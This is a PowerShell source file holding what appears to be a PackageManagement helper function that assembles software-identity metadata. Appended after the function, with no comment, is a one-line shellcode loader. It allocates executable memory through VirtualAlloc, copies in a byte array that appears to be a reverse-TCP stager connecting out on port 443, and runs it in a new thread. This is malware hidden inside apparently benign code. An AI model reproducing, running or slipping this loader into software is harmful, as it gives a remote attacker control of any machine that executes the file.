function New-SoftwareIdentityFromPackage
{
    param
    (
        [Parameter(Mandatory=$true)]
        $Package,

        [Parameter(Mandatory=$true)]
        [string]
        $PackageManagementProviderName,

        [Parameter(Mandatory=$true)]
        [string]
        $SourceLocation,

        [Parameter()]
        [switch]
        $IsFromTrustedSource,

        [Parameter(Mandatory=$true)]
        $request,

        [Parameter(Mandatory=$true)]
        [string]
        $Type,

        [Parameter()]
        [string]
        $InstalledLocation,

        [Parameter()]
        [System.DateTime]
        $InstalledDate,

        [Parameter()]
        [System.DateTime]
        $UpdatedDate
    )

    $fastPackageReference = New-FastPackageReference -ProviderName $PackageManagementProviderName `
                                                     -PackageName $Package.Name `
                                                     -Version $Package.Version `
                                                     -Source $SourceLocation `
                                                     -ArtifactType $Type

    $links = New-Object -TypeName  System.Collections.ArrayList
    foreach($lnk in $Package.Links)
    {
        if( $lnk.Relationship -eq "icon" -or $lnk.Relationship -eq "license" -or $lnk.Relationship -eq "project" )
        {
            $links.Add( (New-Link -Href $lnk.HRef -RelationShip $lnk.Relationship )  )
        }
    }

    $entities = New-Object -TypeName  System.Collections.ArrayList
    foreach( $entity in $Package.Entities )
    {
        if( $entity.Role -eq "author" -or $entity.Role -eq "owner" )
        {
            $entities.Add( (New-Entity -Name $entity.Name -Role $entity.Role -RegId $entity.RegId -Thumbprint $entity.Thumbprint)  )
        }
    }

    $deps = (new-Object -TypeName  System.Collections.ArrayList)
    foreach( $dep in $pkg.Dependencies )
    {
        
        $newDep = New-Dependency -ProviderName $script:PSModuleProviderName `
                                 -PackageName $request.Services.ParsePackageName($dep) `
                                 -Version $request.Services.ParsePackageVersion($dep) `
                                 -Source $SourceLocation

        $deps.Add( $newDep )
    }


    $details =  New-Object -TypeName  System.Collections.Hashtable

	foreach ( $key in $Package.Metadata.Keys.LocalName)
	{
		if (!$details.ContainsKey($key))
		{
			$details.Add($key, (Get-First $Package.Metadata[$key]) )
		}
	}

    $details.Add( "PackageManagementProvider" , $PackageManagementProviderName )

    if($InstalledLocation)
    {
        $details.Add( $script:InstalledLocation , $InstalledLocation )
    }

    if($InstalledDate)
    {
        $details.Add( 'installeddate' , $InstalledDate.ToString('O', [System.Globalization.DateTimeFormatInfo]::InvariantInfo) )
    }

    if($UpdatedDate)
    {
        $details.Add( 'updateddate' , $UpdatedDate.ToString('O', [System.Globalization.DateTimeFormatInfo]::InvariantInfo) )
    }

    
    $sourceNameForSoftwareIdentity = $SourceLocation

    $sourceName = (Get-SourceName -Location $SourceLocation)

    if($sourceName)
    {
        $details.Add( "SourceName" , $sourceName )

        
        $sourceNameForSoftwareIdentity = $sourceName
    }

    $params = @{FastPackageReference = $fastPackageReference;
                Name = $Package.Name;
                Version = $Package.Version;
                versionScheme  = "MultiPartNumeric";
                Source = $sourceNameForSoftwareIdentity;
                Summary = $Package.Summary;
                SearchKey = $Package.Name;
                FullPath = $Package.FullPath;
                FileName = $Package.Name;
                Details = $details;
                Entities = $entities;
                Links = $links;
                Dependencies = $deps;
               }

    if($IsFromTrustedSource)
    {
        $params["FromTrustedSource"] = $true
    }

    $sid = New-SoftwareIdentity @params

    return $sid
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x35,0xe9,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

